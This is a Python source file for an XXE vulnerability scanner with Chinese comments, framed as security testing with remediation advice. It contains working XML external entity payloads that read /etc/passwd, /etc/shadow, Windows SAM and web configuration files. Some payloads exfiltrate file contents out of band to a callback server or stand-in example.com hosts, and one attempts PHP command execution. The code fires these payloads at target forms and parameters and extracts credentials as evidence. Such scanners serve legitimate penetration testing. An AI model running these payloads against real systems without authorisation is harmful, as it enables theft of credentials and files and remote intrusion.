#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
XXE（XML外部实体注入）扫描器模块，负责扫描XXE漏洞
"""

import re
import logging
import random
import string
import time
import uuid
import base64
import urllib.parse
import socket
import threading
import http.server
import socketserver
from urllib.parse import urlparse, urlencode, parse_qsl, unquote

logger = logging.getLogger('xss_scanner')

class OOBXXEServer(threading.Thread):
    """带外(OOB)XXE检测服务器类"""
    
    def __init__(self, host='localhost', port=0):
        """
        初始化OOB XXE检测服务器
        
        Args:
            host: 服务器主机名
            port: 服务器端口
        """
        super().__init__()
        self.daemon = True
        self.host = host
        self.port = port
        self.server = None
        self.detected_xxe = []
        self.uuid_to_details = {}
        
    def run(self):
        """运行OOB XXE检测服务器"""
        class XXEHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                # 禁止日志输出
                pass
                
            def do_GET(self):
                # 响应状态码
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                
                # 记录请求到detected_xxe
                request_id = self.path.strip('/').split('/')[-1]
                attack_details = self.server.uuid_to_details.get(request_id, {})
                
                if request_id and len(request_id) > 8:  # 有效的UUID
                    self.server.detected_xxe.append({
                        'id': request_id,
                        'timestamp': time.time(),
                        'remote_addr': self.client_address[0],
                        'path': self.path,
                        'headers': {k: v for k, v in self.headers.items()},
                        'attack_details': attack_details
                    })
                    logger.info(f"检测到XXE回调: {request_id} 来自 {self.client_address[0]}")
                
                # 响应内容
                self.wfile.write(b"<?xml version='1.0'?><!DOCTYPE data SYSTEM 'http://invalid/invalid.dtd'><data></data>")
                
        class XXEServer(socketserver.ThreadingTCPServer):
            allow_reuse_address = True
            def __init__(self, server_address, handler_class):
                super().__init__(server_address, handler_class)
                self.detected_xxe = []
                self.uuid_to_details = {}
                
        try:
            self.server = XXEServer((self.host, self.port), XXEHandler)
            self.server.detected_xxe = self.detected_xxe
            self.server.uuid_to_details = self.uuid_to_details
            actual_port = self.server.server_address[1]
            if self.port == 0:
                self.port = actual_port
            logger.info(f"OOB XXE检测服务器启动在 {self.host}:{self.port}")
            self.server.serve_forever()
        except Exception as e:
            logger.error(f"启动OOB XXE检测服务器失败: {str(e)}")
        
    def stop(self):
        """停止OOB XXE检测服务器"""
        if self.server:
            self.server.shutdown()
            
    def register_attack(self, uuid_str, details):
        """
        注册攻击到OOB服务器
        
        Args:
            uuid_str: 攻击的UUID
            details: 攻击详情
        """
        self.uuid_to_details[uuid_str] = details
        
    def check_detection(self, uuid_str):
        """
        检查是否检测到指定UUID的XXE攻击
        
        Args:
            uuid_str: 要检查的UUID
            
        Returns:
            bool: 是否检测到XXE攻击
        """
        for detection in self.detected_xxe:
            if detection['id'] == uuid_str:
                return True
        return False

class XXEScanner:
    """XXE扫描器类，负责扫描XML外部实体注入漏洞"""
    
    def __init__(self, http_client):
        """
        初始化XXE扫描器
        
        Args:
            http_client: HTTP客户端对象
        """
        self.http_client = http_client
        
        # 生成唯一标识符，用于检测XXE漏洞
        self.xxe_id = str(uuid.uuid4()).replace('-', '')[:16]
        
        # XXE回调域名（尝试使用本地服务器）
        try:
            # 尝试启动本地OOB服务器
            self.oob_server = OOBXXEServer(host='0.0.0.0', port=0)
            self.oob_server.start()
            time.sleep(1)  # 等待服务器启动
            
            # 获取本机IP
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            
            self.callback_domain = f"http://{ip}:{self.oob_server.port}/{self.xxe_id}"
            self.dtd_server = f"http://{ip}:{self.oob_server.port}/{self.xxe_id}.dtd"
            self.oob_available = True
            logger.info(f"OOB XXE检测服务器启动成功: {self.callback_domain}")
        except Exception as e:
            logger.warning(f"启动OOB XXE检测服务器失败: {str(e)}, 将使用示例域名")
            # 使用示例域名
            self.callback_domain = f"http://xxe-check.example.com/{self.xxe_id}"
            self.dtd_server = f"http://dtd-server.example.com/{self.xxe_id}.dtd"
            self.oob_available = False
        
        # XXE Payload数据文件/目录
        self.common_data_files = [
            # Linux系统文件
            "/etc/passwd",
            "/etc/hosts",
            "/etc/shadow",
            "/etc/group",
            "/etc/issue",
            "/etc/motd",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            
            # Windows系统文件
            "C:/Windows/win.ini",
            "C:/boot.ini",
            "C:/Windows/System32/drivers/etc/hosts",
            "C:/Windows/System32/config/SAM",
            
            # Web应用配置文件
            "/var/www/html/config.php",
            "/var/www/html/wp-config.php",
            "/var/www/html/configuration.php",
            "/var/www/config/config.ini",
            "/usr/local/etc/apache22/httpd.conf",
            "/usr/local/etc/apache24/httpd.conf",
            "/etc/nginx/nginx.conf",
            "/etc/httpd/conf/httpd.conf",
            
            # 源代码目录
            "file:///var/www/html/",
            "file:///var/www/",
            "file:///var/",
            "file:///home/",
            "file:///usr/local/tomcat/conf/server.xml"
        ]
        
        # XXE检测Payload列表 - 基础
        self.basic_payloads = [
            # 基本外部实体声明
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>""",
            
            # 参数实体
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
            %xxe;
            ]>
            <foo></foo>""",
            
            # 带外数据泄露 (OOB)
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY % xxe SYSTEM "{self.dtd_server}" >
            %xxe;
            ]>
            <foo></foo>""",
            
            # 带外请求 (OOB)
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY % xxe SYSTEM "{self.callback_domain}" >
            %xxe;
            ]>
            <foo></foo>""",
            
            # PHP环境探测
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
            <foo>&xxe;</foo>""",
            
            # 基本DTD实体定义
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE data [
            <!ENTITY file SYSTEM "file:///etc/passwd">
            ]>
            <data>&file;</data>"""
        ]
        
        # XXE检测Payload列表 - 高级
        self.advanced_payloads = [
            # 带外XXE - 数据泄露 (OOB exfiltration)
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE data [
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % dtd SYSTEM "{self.dtd_server}">
            %dtd;
            ]>
            <data>&send;</data>""",
            
            # Blind XXE with error-based exfiltration
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE data [
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
            %eval;
            %error;
            ]>
            <data>Test</data>""",
            
            # XXE via SOAP
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
            <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <soap:Body><foo>&xxe;</foo></soap:Body>
            </soap:Envelope>""",
            
            # XXE via SVG
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE svg [ 
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <svg width="100" height="100">
                <text x="10" y="20">&xxe;</text>
            </svg>""",
            
            # XXE通过XSLT
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <?xml-stylesheet type="text/xsl" href="#stylesheet"?>
            <!DOCTYPE doc [
            <!ENTITY % dtd SYSTEM "file:///etc/passwd">
            %dtd;
            ]>
            <doc>
            <stylesheet id="stylesheet">
            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
            <xsl:template match="/">
            <p>Passwd content: &xxe;</p>
            </xsl:template>
            </xsl:stylesheet>
            </doc>""",
            
            # 扩展实体XXE 
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "expect://id" >]>
            <foo>&xxe;</foo>""",
            
            # XXE to RCE (PHP)
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=data://text/plain,<?php system($_GET['cmd']); ?>" >]>
            <foo>&xxe;</foo>""",
            
            # XML Parameter Entities
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
            <!ENTITY % remote SYSTEM "{self.callback_domain}">
            %remote;
            ]>
            <root/>""",
            
            # XXE基于错误的数据提取
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
            <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
            <!ENTITY % load "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">
            %load;
            %error;
            ]>
            <foo></foo>""",
            
            # 压缩实体引用(ZIP)
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "jar:file:///tmp/evil.jar!/file.txt" >]>
            <foo>&xxe;</foo>""",
            
            # 带有编码过滤器的PHP数据读取 
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
            <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
            <root>&xxe;</root>""",
            
            # XXE通过Office文档格式(XML)
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE office:document-content [
            <!ENTITY % remote SYSTEM "{self.callback_domain}">
            %remote;
            ]>
            <office:document-content></office:document-content>"""
        ]
        
        # 合并所有Payload
        self.payloads = self.basic_payloads + self.advanced_payloads
        
        # DTD定义，用于OOB数据渗出
        self.dtd_content = f"""<!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % combined "<!ENTITY send SYSTEM '{self.callback_domain}?data=%file;'>">
        %combined;"""
        
        # 为OAST检测方法准备的唯一标识符
        self.oast_identifiers = {}
        
    def generate_xxe_payload(self, target_file):
        """
        生成针对指定文件的XXE有效载荷
        
        Args:
            target_file: 目标文件路径
            
        Returns:
            str: XXE有效载荷
        """
        uuid_str = str(uuid.uuid4()).replace('-', '')[:8]
        
        # 有效载荷模板
        templates = [
            # 标准文件读取
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
            <!ENTITY % file SYSTEM "file://{target_file}">
            <!ENTITY % dtd SYSTEM "{self.dtd_server}">
            %dtd;
            ]>
            <root>&send;</root>""",
            
            # 错误泄露
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
            <!ENTITY % file SYSTEM "file://{target_file}">
            <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
            %eval;
            %error;
            ]>
            <root>XXE Test</root>""",
            
            # PHP过滤器
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
            <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={target_file}">
            ]>
            <root>&xxe;</root>""",
            
            # 直接引用实体
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
            <!ENTITY xxe SYSTEM "file://{target_file}">
            ]>
            <root>&xxe;</root>"""
        ]
        
        # 随机选择一个模板
        return random.choice(templates)
        
    def register_oast_attack(self, param_name, url, payload_type="XXE"):
        """
        注册一个OAST攻击用于追踪
        
        Args:
            param_name: 参数名
            url: 目标URL
            payload_type: 有效载荷类型
            
        Returns:
            str: 唯一标识符
        """
        uuid_str = str(uuid.uuid4()).replace('-', '')[:12]
        self.oast_identifiers[uuid_str] = {
            'param': param_name,
            'url': url,
            'timestamp': time.time(),
            'type': payload_type
        }
        
        # 如果OOB服务器可用，注册攻击
        if hasattr(self, 'oob_server') and self.oob_available:
            self.oob_server.register_attack(uuid_str, self.oast_identifiers[uuid_str])
            
        return uuid_str
        
    def scan_form(self, url, form, field):
        """
        扫描表单中的XXE漏洞
        
        Args:
            url: 页面URL
            form: 表单信息
            field: 字段信息
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        logger.debug(f"扫描表单字段: {field.get('name')} @ {url} 的XXE漏洞")
        
        # 检查字段类型，只处理可能包含XML内容的字段
        field_type = field.get('type', '').lower()
        field_name = field.get('name', '').lower()
        
        # 如果不是可能包含XML的字段，则跳过
        if not (field_type in ['text', 'textarea', 'file'] or 
                any(xml_hint in field_name for xml_hint in ['xml', 'soap', 'wsdl', 'config', 'data'])):
            return None
            
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 依次测试每个XXE Payload
        for payload in self.payloads:
            # 注册OAST攻击
            oast_id = self.register_oast_attack(field['name'], url)
            
            # 替换Payload中的UUID
            payload = payload.replace(self.xxe_id, oast_id)
            
            # 构建表单数据
            form_data = {}
            for f in form.get('fields', []):
                if f.get('name'):
                    if f['name'] == field['name']:
                        form_data[f['name']] = payload
                    else:
                        form_data[f['name']] = f.get('value', '')
            
            # 提交表单
            try:
                logger.debug(f"测试XXE Payload: {payload[:100]}...")
                headers = {'Content-Type': 'application/xml'}
                
                if method == 'POST':
                    response = self.http_client.post(action_url, data=form_data, headers=headers)
                else:
                    response = self.http_client.get(action_url, params=form_data, headers=headers)
                    
                # 检查响应内容中是否包含敏感信息
                if response and self._check_xxe_success(response.text):
                    return {
                        'type': 'XXE',
                        'url': url,
                        'form_action': action_url,
                        'form_method': method,
                        'parameter': field['name'],
                        'payload': payload,
                        'evidence': self._extract_evidence(response.text),
                        'severity': '高',
                        'description': f"在表单字段'{field['name']}'中发现XXE漏洞",
                        'details': {
                            "表单操作": action_url,
                            "表单方法": method,
                            "漏洞字段": field['name'],
                            "有效载荷": payload
                        },
                        'recommendation': "禁用XML外部实体解析，使用安全的XML解析库，验证并过滤用户输入"
                    }
                
                # 检查OOB XXE检测结果
                if hasattr(self, 'oob_server') and self.oob_available:
                    time.sleep(2)  # 等待可能的回调
                    if self.oob_server.check_detection(oast_id):
                        return {
                            'type': 'XXE',
                            'subtype': 'Out-of-Band XXE',
                            'url': url,
                            'form_action': action_url,
                            'form_method': method,
                            'parameter': field['name'],
                            'payload': payload,
                            'severity': '高',
                            'description': f"在表单字段'{field['name']}'中发现带外(OOB)XXE漏洞",
                            'details': {
                                "表单操作": action_url,
                                "表单方法": method,
                                "漏洞字段": field['name'],
                                "有效载荷": payload,
                                "检测方法": "带外(OOB)XXE检测"
                            },
                            'recommendation': "禁用XML外部实体解析，使用安全的XML解析库，验证并过滤用户输入"
                        }
            except Exception as e:
                logger.error(f"测试XXE Payload时发生错误: {str(e)}")
                
        # 目标文件特定测试
        for target_file in self.common_data_files[:5]:  # 限制测试数量
            payload = self.generate_xxe_payload(target_file)
            
            # 构建表单数据
            form_data = {}
            for f in form.get('fields', []):
                if f.get('name'):
                    if f['name'] == field['name']:
                        form_data[f['name']] = payload
                    else:
                        form_data[f['name']] = f.get('value', '')
                        
            # 提交表单
            try:
                logger.debug(f"测试针对 {target_file} 的XXE Payload")
                headers = {'Content-Type': 'application/xml'}
                
                if method == 'POST':
                    response = self.http_client.post(action_url, data=form_data, headers=headers)
                else:
                    response = self.http_client.get(action_url, params=form_data, headers=headers)
                    
                # 检查响应内容中是否包含敏感信息
                if response and self._check_xxe_success(response.text):
                    return {
                        'type': 'XXE',
                        'url': url,
                        'form_action': action_url,
                        'form_method': method,
                        'parameter': field['name'],
                        'payload': payload,
                        'target_file': target_file,
                        'evidence': self._extract_evidence(response.text),
                        'severity': '高',
                        'description': f"在表单字段'{field['name']}'中发现XXE漏洞，可读取文件 {target_file}",
                        'details': {
                            "表单操作": action_url,
                            "表单方法": method,
                            "漏洞字段": field['name'],
                            "有效载荷": payload,
                            "目标文件": target_file
                        },
                        'recommendation': "禁用XML外部实体解析，使用安全的XML解析库，验证并过滤用户输入"
                    }
            except Exception as e:
                logger.error(f"测试特定文件XXE Payload时发生错误: {str(e)}")
            
        return None
        
    def scan_parameter(self, url, param):
        """
        扫描URL参数中的XXE漏洞
        
        Args:
            url: 页面URL
            param: 参数名
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        logger.debug(f"扫描URL参数: {param} @ {url} 的XXE漏洞")
        
        # 解析URL
        parsed_url = urlparse(url)
        
        # 获取查询参数
        query_params = dict(parse_qsl(parsed_url.query))
        
        # 如果参数不存在，则跳过
        if param not in query_params:
            return None
            
        # 构建基础URL
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # 如果参数名称中不包含可能的XML相关提示，则跳过
        param_lower = param.lower()
        if not any(xml_hint in param_lower for xml_hint in ['xml', 'soap', 'wsdl', 'config', 'data']):
            return None
            
        # 依次测试每个XXE Payload
        for payload in self.payloads:
            # 注册OAST攻击
            oast_id = self.register_oast_attack(param, url)
            
            # 替换Payload中的UUID
            payload = payload.replace(self.xxe_id, oast_id)
            
            # 构建新的查询参数
            new_params = query_params.copy()
            new_params[param] = payload
            
            # 构建测试URL
            query_string = urlencode(new_params)
            test_url = f"{base_url}?{query_string}"
            
            try:
                logger.debug(f"测试XXE Payload: {payload[:100]}...")
                headers = {'Content-Type': 'application/xml'}
                
                # 发送请求
                response = self.http_client.get(test_url, headers=headers)
                    
                # 检查响应内容中是否包含敏感信息
                if response and self._check_xxe_success(response.text):
                    return {
                        'type': 'XXE',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': self._extract_evidence(response.text),
                        'severity': '高',
                        'description': f"在URL参数'{param}'中发现XXE漏洞",
                        'details': {
                            "URL": url,
                            "漏洞参数": param,
                            "有效载荷": payload
                        },
                        'recommendation': "禁用XML外部实体解析，使用安全的XML解析库，验证并过滤用户输入"
                    }
                
                # 检查OOB XXE检测结果
                if hasattr(self, 'oob_server') and self.oob_available:
                    time.sleep(2)  # 等待可能的回调
                    if self.oob_server.check_detection(oast_id):
                        return {
                            'type': 'XXE',
                            'subtype': 'Out-of-Band XXE',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'severity': '高',
                            'description': f"在URL参数'{param}'中发现带外(OOB)XXE漏洞",
                            'details': {
                                "URL": url,
                                "漏洞参数": param,
                                "有效载荷": payload,
                                "检测方法": "带外(OOB)XXE检测"
                            },
                            'recommendation': "禁用XML外部实体解析，使用安全的XML解析库，验证并过滤用户输入"
                        }
            except Exception as e:
                logger.error(f"测试XXE Payload时发生错误: {str(e)}")
            
        return None
        
    def _check_xxe_success(self, content):
        """
        检查响应内容中是否包含XXE漏洞证据
        
        Args:
            content: 响应内容
            
        Returns:
            bool: 是否存在XXE漏洞
        """
        if not content:
            return False
            
        # 检查是否包含常见敏感文件的特征
        indicators = [
            # /etc/passwd文件特征
            r"root:.*:0:0:",
            r"nobody:.*:65534:",
            r"daemon:.*:1:1:",
            
            # Windows系统文件特征
            r"\[fonts\]",
            r"\[extensions\]",
            r"for 16-bit app support",
            
            # 各种配置文件特征
            r"<VirtualHost",
            r"<Directory",
            r"DocumentRoot",
            r"Listen 80",
            r"<IfModule",
            r"worker_processes",
            r"http {",
            r"server {",
            
            # PHP配置文件特征
            r"DB_PASSWORD",
            r"DB_HOST",
            r"define\s*\(\s*['\"](DB_|SECURE_AUTH_)",
            
            # 基础Base64编码的特征
            r"^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$"
        ]
        
        for indicator in indicators:
            if re.search(indicator, content):
                return True
                
        # 检查是否包含可能的Base64编码内容
        base64_pattern = r"([A-Za-z0-9+/]{40,}={0,2})"
        matches = re.findall(base64_pattern, content)
        for match in matches:
            try:
                decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                # 检查解码后的内容是否包含敏感信息
                if (re.search(r"root:.*:0:0:", decoded) or 
                    re.search(r"<\?php", decoded) or 
                    re.search(r"<!DOCTYPE", decoded) or
                    re.search(r"<html", decoded)):
                    return True
            except:
                pass
                
        return False
        
    def _extract_evidence(self, content):
        """
        从响应内容中提取XXE漏洞证据
        
        Args:
            content: 响应内容
            
        Returns:
            str: XXE漏洞证据
        """
        # 提取敏感信息作为证据
        evidence = []
        
        # 提取/etc/passwd内容
        passwd_match = re.search(r"(root:.*:0:0:.*?)\n", content)
        if passwd_match:
            evidence.append(f"Found /etc/passwd content: {passwd_match.group(1)}")
            
        # 提取可能的Base64编码内容
        base64_pattern = r"([A-Za-z0-9+/]{40,}={0,2})"
        matches = re.findall(base64_pattern, content)
        for match in matches:
            try:
                decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                if re.search(r"root:.*:0:0:", decoded) or re.search(r"<\?php", decoded):
                    evidence.append(f"Found Base64 encoded sensitive data: {decoded[:100]}...")
            except:
                pass
                
        # 提取Windows文件内容
        if re.search(r"\[fonts\]", content) or re.search(r"\[extensions\]", content):
            evidence.append("Found Windows configuration file content")
            
        # 提取配置文件内容
        if re.search(r"DB_PASSWORD", content) or re.search(r"DB_HOST", content):
            evidence.append("Found database configuration details")
            
        if not evidence:
            # 如果没有找到特定证据，返回内容摘要
            return f"Suspicious content found: {content[:200]}..."
        else:
            return "\n".join(evidence)
            
    def check_callback_server(self):
        """
        检查回调服务器是否收到XXE回调
        
        Returns:
            list: 检测到的XXE回调列表
        """
        if hasattr(self, 'oob_server') and self.oob_available:
            return self.oob_server.detected_xxe
        return []
        
    def close(self):
        """关闭资源"""
        if hasattr(self, 'oob_server') and self.oob_available:
            self.oob_server.stop()
            
    def can_scan_form(self):
        """是否可以扫描表单"""
        return True
        
    def can_scan_params(self):
        """是否可以扫描URL参数"""
        return True 